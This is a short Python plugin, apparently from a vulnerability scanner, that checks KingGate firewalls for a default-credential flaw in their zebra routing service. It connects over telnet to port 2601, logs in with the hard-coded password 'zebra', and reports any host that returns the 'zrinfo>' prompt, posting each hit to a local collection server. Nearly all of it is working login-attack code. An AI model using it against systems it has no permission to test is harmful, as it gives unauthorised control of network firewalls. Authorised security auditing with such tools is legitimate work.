#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: KingGate防火墙默认配置不当可被远控
referer: http://www.wooyun.org/bugs/wooyun-2015-0135809
author: Lucifer
description: 由于KingGate防火墙使用zebra路由软件的，这是一款由Cisco自主开发的闭源路由器软件，默认开启2601端口，而且默认密码是zebra。
'''
import sys
import warnings
import telnetlib
from termcolor import cprint
from urllib.parse import urlparse
import requests
class kinggate_zebra_conf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 2601
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            #连接Telnet服务器
            tlib = telnetlib.Telnet(host, port, timeout=6)
            #tlib.set_debuglevel(2)
            #登陆
            tlib.read_until(b"Password:", timeout=6)
            tlib.write(b"zebra\r\n")
            result = tlib.read_until(b"zrinfo>", timeout=6)
            tlib.close()
            if result.find(b"zrinfo>") is not -1:
                cprint("[+]存在KingGate zebra默认配置漏洞...(高危)\tpayload: "+host+":"+str(port)+" pass:zebra", "red")
                postdata = {self.url:"存在KingGate zebra默认配置漏洞...(高危)\tpayload: "+host+":"+str(port)+" pass:zebra"}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在kinggate_zebra_conf漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = kinggate_zebra_conf_BaseVerify(sys.argv[1])
    testVuln.run()